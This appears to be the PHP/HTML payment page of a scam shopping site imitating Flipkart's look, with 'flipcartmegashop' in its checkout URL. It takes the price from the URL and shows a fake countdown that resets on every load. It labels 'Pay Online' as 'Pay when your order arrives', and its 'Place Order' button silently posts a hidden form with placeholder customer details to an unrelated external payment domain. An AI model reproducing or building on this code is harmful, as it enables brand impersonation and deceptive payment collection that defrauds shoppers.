<?php
require_once __DIR__ . '/../../includes/helpers.php';

// URL is /payment?id=<sellingPrice>.<mrp>  (e.g. /payment?id=278.4155)
$raw_id = $_GET['id'] ?? '';
$parts  = explode('.', (string)$raw_id, 2);
$selling = (int)($parts[0] ?? 0);
$mrp     = (int)($parts[1] ?? 0);

if ($selling <= 0) {
    header('Location: /cart');
    exit;
}

$page_title = 'Payments';
include __DIR__ . '/../../includes/layout-head.php';
?>
  <div>
    <div class="container-fluid py-2 header-container">
      <div class="row header py-2">
        <div class="col-1">
          <div class="menu-icon">
            <svg width="19" height="16" viewBox="0 0 19 16" xmlns="http://www.w3.org/2000/svg" onclick="window.location.href='/'">
              <path d="M17.556 7.847H1M7.45 1L1 7.877l6.45 6.817" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none" />
            </svg>
          </div>
        </div>
        <div class="col-8"><div class="menu-logo"><h4 class="mb-0 mt-1 ms-2">Payments</h4></div></div>
      </div>
    </div>

    <div style="background:#fff;padding:16px 12px 14px;border-bottom:1px solid #eaeaf2">
      <div style="display:flex;align-items:flex-start;justify-content:space-between;max-width:460px;margin:0 auto">
        <div style="display:flex;flex-direction:column;align-items:center;width:80px">
          <div style="width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#2874F0;color:#fff;font-weight:700;font-size:13px">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" /></svg>
          </div>
          <span style="font-size:11px;margin-top:6px;color:#2874F0;font-weight:600">Address</span>
        </div>
        <div style="flex:1;height:2px;background:#2874F0;margin-top:13px"></div>
        <div style="display:flex;flex-direction:column;align-items:center;width:110px">
          <div style="width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#2874F0;color:#fff;font-weight:700;font-size:13px">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" /></svg>
          </div>
          <span style="font-size:11px;margin-top:6px;color:#2874F0;font-weight:600">Order Summary</span>
        </div>
        <div style="flex:1;height:2px;background:#2874F0;margin-top:13px"></div>
        <div style="display:flex;flex-direction:column;align-items:center;width:80px">
          <div style="width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#2874F0;color:#fff;font-weight:700;font-size:13px">3</div>
          <span style="font-size:11px;margin-top:6px;color:#222;font-weight:600">Payment</span>
        </div>
      </div>
    </div>

    <div class="card py-1 my-1">
      <div class="py-3 px-3">
        <div class="container-fluid px-0 offerend-container">
          <h4>Offer ends in <span class="offer-timer" id="offerTimer">5min 0sec</span></h4>
        </div>

        <div style="border:2px solid #26a541;border-radius:12px;padding:0;margin:12px 0;background:#f0fbf2;min-height:76px;display:flex;align-items:center">
          <label style="display:flex;align-items:center;gap:18px;width:100%;padding:16px 20px;margin:0">
            <svg width="42" height="42" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
              <rect width="64" height="64" rx="14" fill="#26a541" />
              <rect x="12" y="20" width="40" height="28" rx="4" fill="#fff" opacity="0.95" />
              <rect x="16" y="30" width="32" height="3" rx="1.5" fill="#26a541" />
              <rect x="16" y="36" width="20" height="3" rx="1.5" fill="#26a541" />
              <circle cx="44" cy="40" r="7" fill="#26a541" />
              <path d="M41 40l2 2 4-4" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" fill="none" />
            </svg>
            <div>
              <span style="font-size:16px;font-weight:600;color:#222;display:block">Pay Online</span>
              <span style="font-size:12px;color:#555;margin-top:2px;display:block">Pay when your order arrives</span>
            </div>
          </label>
        </div>
      </div>
    </div>

    <div class="card px-3 py-4 mb-2" id="price-detail">
      <h3>Price Details</h3>
      <div class="price-detail-div mt-2">
        <div class="product-price-list my-3">
          <span class="title">Price (1 item)</span>
          <span class="data me-0" style="text-decoration:line-through;color:#878787">&#8377; <?= h($mrp ?: $selling) ?></span>
        </div>
        <div class="product-price-list my-3">
          <span class="title">Delivery Charges</span>
          <span class="data text-success">FREE</span>
        </div>
        <div class="product-price-list mt-3 pt-3 total">
          <span class="title">Amount Payable</span>
          <span class="data selling_price">&#8377; <?= h($selling) ?></span>
        </div>
      </div>
    </div>

    <img src="/assets/images/safety-badge.jpg" class="w-100 pb-5 mb-3" alt="safety badge" onerror="this.style.display='none'" />

    <div class="button-container flex p-3 bg-white">
      <div class="col-6 footer-price">
        <?php if ($mrp > $selling): ?>
          <span class="strike mrp ms-0 mb-1">- &#8377; <?= h($mrp) ?></span>
        <?php endif; ?>
        <span class="selling_price">&#8377; <?= h($selling) ?></span>
      </div>
      <button class="buynow-button product-page-buy col-6 btn-continue text-center" id="btnPlaceOrder">
        <a class="text-dark">Place Order</a>
      </button>
    </div>
  </div>

  <script>
    (function () {
      var time = 300;
      var el = document.getElementById('offerTimer');
      var timer = setInterval(function () {
        if (time <= 1) { clearInterval(timer); time = 0; }
        else time--;
        var m = Math.floor(time / 60);
        var s = time % 60;
        el.textContent = m + 'min ' + s + 'sec';
      }, 1000);

      var placing = false;
      document.getElementById('btnPlaceOrder').addEventListener('click', function () {
        // if (placing) return;
        // placing = true;
        // var orderId = 'COD' + Date.now();
        // try { localStorage.removeItem('cart'); } catch (e) {}
        // window.location.replace('/payment-success?orderId=' + encodeURIComponent(orderId) + '&amount=<?= (int)$selling ?>&status=done');
        if (placing) return;
        placing = true;

      // Create hidden form
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://sarvaiyaenterprise.shop/flipcartmegashop/razorpay.php';

      // Order ID
      var orderId = document.createElement('input');
      orderId.type = 'hidden';
      orderId.name = 'order_id';
      orderId.value = 'ORD' + Date.now();
      form.appendChild(orderId);

      // Amount
      var amount = document.createElement('input');
      amount.type = 'hidden';
      amount.name = 'final_amount';
      amount.value = '<?= (int)$selling ?>';
      form.appendChild(amount);

      // Customer Name
      var name = document.createElement('input');
      name.type = 'hidden';
      name.name = 'customer_name';
      name.value = 'Customer';
      form.appendChild(name);

      // Email
      var email = document.createElement('input');
      email.type = 'hidden';
      email.name = 'customer_email';
      email.value = 'customer@example.com';
      form.appendChild(email);

      // Phone
      var phone = document.createElement('input');
      phone.type = 'hidden';
      phone.name = 'customer_contact';
      phone.value = '9999999999';
      form.appendChild(phone);

      document.body.appendChild(form);

      try {
        localStorage.removeItem('cart');
      } catch (e) {}

      // Auto submit
      form.submit();
      });
    })();
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
